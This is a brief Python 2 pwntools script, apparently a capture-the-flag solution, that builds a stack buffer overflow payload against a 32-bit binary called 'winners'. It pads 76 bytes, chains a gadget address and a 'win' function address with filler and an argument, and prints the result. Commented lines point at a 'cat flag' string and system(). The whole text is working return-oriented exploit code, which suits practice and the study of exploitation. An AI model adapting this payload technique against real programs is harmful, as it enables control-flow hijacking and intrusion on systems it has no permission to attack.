from pwn import *

# p = process('./winners')


offset = 76
win = 0x08049196
pop_edi_ebp_ret = 0x08049302 # : pop edi; pop ebp; ret; 
cat_flag = 0x804A046
system = 0x08049060

payload = 'A'*(offset)
payload += p32(0x08049301)
payload += 'BBBBCCCCDDDD'
# payload += p32(cat_flag)
payload += p32(win)
payload += 'EEEE'
payload += p32(0x182)

print payload
